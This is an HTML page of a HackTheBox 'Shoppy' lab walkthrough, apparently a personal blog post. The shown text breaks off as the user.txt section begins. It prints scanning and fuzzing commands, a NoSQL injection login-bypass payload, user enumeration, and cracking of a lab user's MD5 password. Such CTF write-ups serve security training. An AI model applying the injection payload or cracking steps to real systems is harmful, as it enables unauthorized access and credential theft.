@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Hackthebox - Shoppy - Saad Akhtar</title><meta name="Description" content="Hackthebox easy machine Shoppy walkthrough &amp; tutorial.."><meta property="og:title" content="Hackthebox - Shoppy" />
+<meta property="og:description" content="Hackthebox easy machine Shoppy walkthrough &amp; tutorial.." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/hackthebox-shoppy/" /><meta property="og:image" content="/hackthebox-shoppy/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-14T16:00:21+05:00" />
+<meta property="article:modified_time" content="2023-01-14T16:00:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/hackthebox-shoppy/0.png"/>
+<meta name="twitter:title" content="Hackthebox - Shoppy"/>
+<meta name="twitter:description" content="Hackthebox easy machine Shoppy walkthrough &amp; tutorial.."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/hackthebox-shoppy/" /><link rel="prev" href="/cryptohack-challenges-general-encoding/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hackthebox - Shoppy",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/hackthebox-shoppy\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/hackthebox-shoppy\/0.png",
+                            "width":  1400 ,
+                            "height":  1060 
+                        }],"genre": "posts","keywords": "hackthebox, machines","wordcount":  1315 ,
+        "url": "\/hackthebox-shoppy\/","datePublished": "2023-01-14T16:00:21+05:00","dateModified": "2023-01-14T16:00:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "Hackthebox easy machine Shoppy walkthrough \u0026 tutorial.."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Hackthebox - Shoppy</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-14">2023-01-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1315 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-shoppy/0.png"
+        data-srcset="/hackthebox-shoppy/0.png, /hackthebox-shoppy/0.png 1.5x, /hackthebox-shoppy/0.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-shoppy/0.png"
+        title="Hackthebox easy machine Shoppy walkthrough &amp; tutorial.." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#usertxt">user.txt</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#roottxt">root.txt</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post is focused on the walkthrough of Easy Machine Shoppy from HackTheBox.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting out with the initial nmap scan.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad👻ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/Desktop/hackthebox/machines/shoppy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -A -vv 10.129.12.86 -oN nmapN
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON  VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApZi3Kltv1yDHTatw6pKZfuIcoHfTnVe0W1yc9Uw7NMUinxjjQaQ731J+eCTwd8hBcZT6HQwcchDNR50Lwyp2a/KpXuH2my+2/tDvISTRTgwfMy1sDrG3+KPEzBag07m7ycshp8KhrRq0faHPrEgcagkb5T8mnT6zr3YonzoMyIpT+Q1O0JAre6GPgJc9im/tjaqhwUxCH5MxJCKQxaUf2SlGjRCH5/xEkNO20BEUYokjoAWwHUWjK2mlIrBQfd4/lcUzMnc5WT9pVBqQBw+/7LbFRyH4TLmGT9PPEr8D8iygWYpuG7WFOZlU8oOhO0+uBqZFgJFFOevq+42q42BvYYR/z+mFox+Q2lz7viSCV7nBMdcWto6USWLrx1AkVXNGeuRjr3l0r/698sQjDy5v0GnU9cMHeYkMc+TuiIaJJ5oRrSg/x53Xin1UogTnTaKLNdGkgynMqyVFklvdnUngRSLsXnwYNgcDrUhXxsfpDu8HVnzerT3q27679+n5ZFM<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHiKrH/B/4murRCo5ju2KuPgkMjQN3Foh7EifMHEOwmoDNjLYBfoAFKgBnrMA9GzA+NGhHVa6L8CAxN3eaGXXMo<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsWhJQCRHjDkHy3HkFLMZoGqCmM3/VfMHMm56u0Ivk
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack nginx 1.23.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.23.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title:             Shoppy Wait Page        
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Unknown favicon MD5: D5F0A0ADD0BFBB2BC51607F78ECE2F57
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Only 2 ports are open. We&rsquo;ll go for port 80.</p>
+<p>We have a website redirecting to <code>shoppy.htb</code>. We&rsquo;ll add this domain in <code>/etc/hosts</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shoppy/1.png" title="Website" data-thumbnail="/hackthebox-shoppy/1.png" data-sub-html="<h2>Website</h2><p>Website</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shoppy/1.png"
+            data-srcset="/hackthebox-shoppy/1.png, /hackthebox-shoppy/1.png 1.5x, /hackthebox-shoppy/1.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shoppy/1.png" width="1366" height="572" />
+    </a><figcaption class="image-caption">Website</figcaption>
+    </figure></p>
+<p>Not much to look at on the main site so we&rsquo;ll go for the dir bruteforcing.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad👻ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/Desktop/hackthebox/machines/shoppy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster dir -u http://shoppy.htb/ -w /usr/share/wordlists/dirb/common.txt -o dir
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/admin                <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 28<span class="o">]</span> <span class="o">[</span>--&gt; /login<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/Admin                <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 28<span class="o">]</span> <span class="o">[</span>--&gt; /login<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/ADMIN                <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 28<span class="o">]</span> <span class="o">[</span>--&gt; /login<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 179<span class="o">]</span> <span class="o">[</span>--&gt; /assets/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span> <span class="o">[</span>--&gt; /css/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/exports              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 181<span class="o">]</span> <span class="o">[</span>--&gt; /exports/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/favicon.ico          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 213054<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 177<span class="o">]</span> <span class="o">[</span>--&gt; /fonts/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 179<span class="o">]</span> <span class="o">[</span>--&gt; /images/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 171<span class="o">]</span> <span class="o">[</span>--&gt; /js/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1074<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/Login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1074<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Visiting <code>/admin</code> we get redirected to <code>/login</code> which is a login page.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shoppy/2.png" title="Login Page" data-thumbnail="/hackthebox-shoppy/2.png" data-sub-html="<h2>Login Page</h2><p>Login Page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shoppy/2.png"
+            data-srcset="/hackthebox-shoppy/2.png, /hackthebox-shoppy/2.png 1.5x, /hackthebox-shoppy/2.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shoppy/2.png" width="1366" height="576" />
+    </a><figcaption class="image-caption">Login Page</figcaption>
+    </figure></p>
+<p>Default credentials didn&rsquo;t work here so we can try for sqli.</p>
+<p>Adding a <code>'</code> at the end of username we are getting a <code>504</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shoppy/3.png" title="504" data-thumbnail="/hackthebox-shoppy/3.png" data-sub-html="<h2>504</h2><p>504</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shoppy/3.png"
+            data-srcset="/hackthebox-shoppy/3.png, /hackthebox-shoppy/3.png 1.5x, /hackthebox-shoppy/3.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shoppy/3.png" width="1366" height="581" />
+    </a><figcaption class="image-caption">504</figcaption>
+    </figure></p>
+<p>On enumerating further, I also tried some NoSQL payloads out of which one of the payload redirected to the admin panel.</p>
+<p>Payload: <code>admin' || '</code></p>
+<p><figure><a class="lightgallery" href="/hackthebox-shoppy/4.png" title="Admin Panel" data-thumbnail="/hackthebox-shoppy/4.png" data-sub-html="<h2>Admin Panel</h2><p>Admin Panel</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shoppy/4.png"
+            data-srcset="/hackthebox-shoppy/4.png, /hackthebox-shoppy/4.png 1.5x, /hackthebox-shoppy/4.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shoppy/4.png" width="1366" height="581" />
+    </a><figcaption class="image-caption">Admin Panel</figcaption>
+    </figure></p>
+<p>Looking around in admin panel, the search for users page searches for the known users and returns a json file containing that user&rsquo;s <code>id</code>, <code>username</code>, and <code>password</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shoppy/5.png" title="Search Users Page" data-thumbnail="/hackthebox-shoppy/5.png" data-sub-html="<h2>Search Users Page</h2><p>Search Users Page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shoppy/5.png"
+            data-srcset="/hackthebox-shoppy/5.png, /hackthebox-shoppy/5.png 1.5x, /hackthebox-shoppy/5.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shoppy/5.png" width="1366" height="579" />
+    </a><figcaption class="image-caption">Search Users Page</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/hackthebox-shoppy/6.png" title="export-search.json" data-thumbnail="/hackthebox-shoppy/6.png" data-sub-html="<h2>export-search.json</h2><p>export-search.json</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shoppy/6.png"
+            data-srcset="/hackthebox-shoppy/6.png, /hackthebox-shoppy/6.png 1.5x, /hackthebox-shoppy/6.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shoppy/6.png" width="1366" height="570" />
+    </a><figcaption class="image-caption">export-search.json</figcaption>
+    </figure></p>
+<p>I tried cracking the admin&rsquo;s password with <code>john</code> but no luck with the <code>rockyou.txt</code> wordlist.</p>
+<p>Also notice that we can enumerate usernames as well with the search users page.</p>
+<p>Using <code>wfuzz</code> we can enumerate other users as well. I used <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt" target="_blank" rel="noopener noreffer ">names.txt</a> from the SecLists.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad👻ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/Desktop/hackthebox/machines/shoppy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ wfuzz -H <span class="s2">&#34;Host: shoppy.htb&#34;</span> -w users.txt --ss <span class="s2">&#34;Download export&#34;</span> -b <span class="s2">&#34;connect.sid=s%3A41NRGQUoz12IMj3vHfsgSbaY2yFHZ-DT.%2F1vdICypeZqYvyhWQXkgxKJoPWuq9SEqCr9jmgSUwUU&#34;</span> http://shoppy.htb/admin/search-users?username<span class="o">=</span><span class="nv">FUZZ</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>                                                                                
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000000086:   <span class="m">200</span>        <span class="m">55</span> L     <span class="m">160</span> W      <span class="m">2720</span> Ch     <span class="s2">&#34;admin&#34;</span>                                                                                
+</span></span><span class="line"><span class="cl">000004909:   <span class="m">200</span>        <span class="m">55</span> L     <span class="m">160</span> W      <span class="m">2720</span> Ch     <span class="s2">&#34;josh&#34;</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And we got another username <code>josh</code>.</p>
+<p>We can look at the password of this user and try cracking it as well.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/shoppy]
+</span></span><span class="line"><span class="cl">└─$ john --wordlist=/home/saad/Documents/wordlists/rockyou.txt --format=Raw-MD5 josh.hash
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+</span></span><span class="line"><span class="cl">Warning: no OpenMP support for this hash type, consider --fork=2
+</span></span><span class="line"><span class="cl">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="line"><span class="cl">remembermethisway (?)     
+</span></span><span class="line"><span class="cl">1g 0:00:00:07 DONE (2022-09-18 06:28) 0.1386g/s 112643p/s 112643c/s 112643C/s renato1989..reiji
+</span></span><span class="line"><span class="cl">Use the &#34;--show --format=Raw-MD5&#34; options to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We successfully cracked the password of <code>josh</code> user which is <code>remembermethisway</code>.</p>
+<p>We can try this password with <code>ssh</code> but sadly no luck with that.</p>
+<p>Another dead end? Now we can fuzz for vhosts.</p>
+<h2 id="foothold">Foothold</h2>
+<p>I tried looking for virtual hosts with different wordlists and <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/bitquark-subdomains-top100000.txt" target="_blank" rel="noopener noreffer ">this</a> wordlist from SecLists found a valid subdomain for us.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/shoppy]
+</span></span><span class="line"><span class="cl">└─$ gobuster vhost -u http://shoppy.htb/ -w /home/saad/Documents/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -o vhost -t 100 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Gobuster v3.1.0
+</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">[+] Url:          http://shoppy.htb/
+</span></span><span class="line"><span class="cl">[+] Method:       GET
+</span></span><span class="line"><span class="cl">[+] Threads:      100
+</span></span><span class="line"><span class="cl">[+] Wordlist:     /home/saad/Documents/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
+</span></span><span class="line"><span class="cl">[+] User Agent:   gobuster/3.1.0
+</span></span><span class="line"><span class="cl">[+] Timeout:      10s
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">2022/09/18 06:34:35 Starting gobuster in VHOST enumeration mode
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
+</span></span><span class="line"><span class="cl">                                                       
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">2022/09/18 06:38:23 Finished
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s add <code>mattermost.shoppy.htb</code> to <code>/etc/hosts</code>.</p>
+<p>Visiting the new subdomain revealed another login page.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shoppy/7.png" title="mattermost.shoppy.htb" data-thumbnail="/hackthebox-shoppy/7.png" data-sub-html="<h2>mattermost.shoppy.htb</h2><p>mattermost.shoppy.htb</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shoppy/7.png"
+            data-srcset="/hackthebox-shoppy/7.png, /hackthebox-shoppy/7.png 1.5x, /hackthebox-shoppy/7.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shoppy/7.png" width="1366" height="586" />
+    </a><figcaption class="image-caption">mattermost.shoppy.htb</figcaption>
+    </figure></p>
+<p>Trying the credentials of <code>josh</code> we found above we can successfully log in.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shoppy/8.png" title="Chat Application" data-thumbnail="/hackthebox-shoppy/8.png" data-sub-html="<h2>Chat Application</h2><p>Chat Application</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shoppy/8.png"
+            data-srcset="/hackthebox-shoppy/8.png, /hackthebox-shoppy/8.png 1.5x, /hackthebox-shoppy/8.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shoppy/8.png" width="1366" height="537" />
+    </a><figcaption class="image-caption">Chat Application</figcaption>
+    </figure></p>
+<p>Looking around the messages in different channels, we found some credentials for user <code>jaeger</code> in the <code>Deploy Machine</code> channel.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shoppy/9.png" title="Deploy Machine Channel" data-thumbnail="/hackthebox-shoppy/9.png" data-sub-html="<h2>Deploy Machine Channel</h2><p>Deploy Machine Channel</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shoppy/9.png"
+            data-srcset="/hackthebox-shoppy/9.png, /hackthebox-shoppy/9.png 1.5x, /hackthebox-shoppy/9.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shoppy/9.png" width="1366" height="578" />
+    </a><figcaption class="image-caption">Deploy Machine Channel</figcaption>
+    </figure></p>
+<p>We can use these credentials to <code>ssh</code> into the machine.</p>
+<p>And we&rsquo;re in.</p>
+<h2 id="usertxt">user.txt</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
